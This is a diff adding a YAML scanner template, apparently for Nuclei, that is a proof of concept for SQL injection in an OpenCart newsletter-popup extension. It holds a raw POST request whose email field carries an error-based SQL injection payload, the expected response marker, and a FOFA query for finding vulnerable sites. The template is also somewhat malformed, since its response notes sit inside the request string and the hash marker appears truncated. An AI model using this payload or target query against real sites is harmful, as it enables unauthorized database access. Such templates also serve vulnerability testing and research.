@@ -1,0 +1,42 @@
+id: poc-qk83fvqgeyac9i7d
+info:
+  name: OpenCart电子商务建站系统-SQL-extension
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qk83fvqgeyac9i7d'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qk83fvqgeyac9i7d
+    fofa: body="extension/module/so_newletter_custom_popup/newsletter"
+http:
+- raw:
+  - 'POST /index.php?route=extension/module/so_newletter_custom_popup/newsletter HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    createdate=2024-5-15 09:4:6&email=hi'' AND (SELECT 4828 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT md5(123)),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#&status=0
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    cb962ac59075b964b07152d23
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
